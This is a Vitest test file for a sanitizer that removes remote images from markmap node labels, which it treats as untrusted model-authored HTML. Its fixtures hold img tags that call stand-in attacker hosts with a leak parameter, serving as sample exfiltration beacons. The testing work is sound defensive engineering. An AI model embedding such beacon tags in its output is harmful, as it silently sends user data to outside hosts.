// @vitest-environment jsdom

import { sanitizeMarkmapTree } from "@/lib/sanitizeMarkmap";
import { describe, expect, it } from "vitest";

/**
 * 10 P3-3: markmap's node-label HTML is model-authored and untrusted. A remote `<img>`
 * is a no-click render-time egress beacon; the sanitizer must remove it (matching the
 * JS-layer defense mermaid/vega already have) while keeping self-contained inline images.
 */
describe("sanitizeMarkmapTree", () => {
  it("strips a remote http(s) <img> from a node label", () => {
    const root = {
      content: 'x <img src="http://attacker.example/?leak=1"> y',
      children: [],
    };
    sanitizeMarkmapTree(root);
    expect(root.content).not.toContain("attacker.example");
    expect(root.content).not.toContain("<img");
  });

  it("keeps inline data: / blob: images (no network reach)", () => {
    const root = {
      content: '<img src="data:image/png;base64,AAAA">',
      children: [],
    };
    sanitizeMarkmapTree(root);
    expect(root.content).toContain("data:image/png");
  });

  it("recurses into children, stripping remote images deep in the tree", () => {
    const root = {
      content: "root",
      children: [
        { content: 'a <img src="https://evil.example/x.png"> b', children: [] },
        { content: "plain child", children: [] },
      ],
    };
    sanitizeMarkmapTree(root);
    expect((root.children[0] as { content: string }).content).not.toContain(
      "evil.example",
    );
    expect((root.children[1] as { content: string }).content).toBe(
      "plain child",
    );
  });

  it("leaves image-free content as the identical string (no needless rewrite)", () => {
    const html = "no image here, just <strong>text</strong>";
    const root = { content: html, children: [] };
    sanitizeMarkmapTree(root);
    expect(root.content).toBe(html);
  });
});
